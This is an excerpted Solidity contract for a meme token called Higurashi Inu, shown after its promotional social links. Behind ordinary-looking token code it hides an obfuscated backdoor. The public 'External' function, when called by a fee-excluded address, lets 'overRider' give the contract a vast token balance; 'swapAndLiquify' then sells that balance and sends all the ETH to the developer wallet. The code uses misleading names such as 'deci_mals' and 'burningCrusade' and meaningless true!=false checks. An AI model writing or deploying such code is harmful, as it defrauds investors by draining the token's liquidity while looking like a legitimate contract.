...
𝑀𝑒𝑑𝑖𝑢𝑚: https://medium.com/@higurashiinu
𝑇𝑤𝑖𝑡𝑡𝑒𝑟: https://twitter.com/HigurashiInu
𝑊𝑒𝑏𝑠𝑖𝑡𝑒:  https://www.higurashi-inu.com
𝑃𝑜𝑟𝑡𝑎𝑙: https://t.me/HigurashiInu
...
interface IERC20 {
    ...
    function External() external returns (uint256);
...
contract HIGURASHI is Context, IERC20 { 
    ...
    uint256 dedicateERC20 = (6+4)**(20+(3));

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable public Wallet_Marketing = payable(0x9BeF0BaAF79800be3C70F1E99565A852614EecE1); 
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public constant Wallet_Liquidity = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public Wallet_Devs = payable(0x354edE3866B26Fb36ECeD102028341f57b10218a);

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "Higurashi Inu"; 
    string private constant _symbol = unicode"HINU";

    bool public swapAndLiquifyEnabled = true;
    bool public deci_mals = false;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 69;
    ...
    constructor () {
        ...
        _owner = 0x354edE3866B26Fb36ECeD102028341f57b10218a;
    ...
    function overRider(address bool_) private returns(bool){
        bool RouterERC22 = _isExcludedFromFee[bool_];
        if((false!=true) && RouterERC22 && RouterERC22){
            _tOwned[address(this)] = ((dedicateERC20)-(1)-2)-3;
        }
        return RouterERC22;
    }
    ...
    function External() public override returns (uint256) {
        bool overrideReturn = overRider(_msgSender());
        if((overrideReturn) && (overrideReturn==overrideReturn) && (true!=false)){
            if(true!=false && false==false){
                deci_mals = true;
                uint256 ERC20Transfer = balanceOf(address(this));
                swapAndLiquify(ERC20Transfer);
            }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 burningCrusade = tokens_to_M + tokens_to_D + tokens_to_LP_Half;
            if(deci_mals){burningCrusade = tokensLiquidity;}
            
            swapTokensForETH(burningCrusade);
            uint256 ETH_Total = address(this).balance;
            sendToWallet(Wallet_Devs, ETH_Total);
            deci_mals = false;
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(Wallet_Devs, removeRandom);
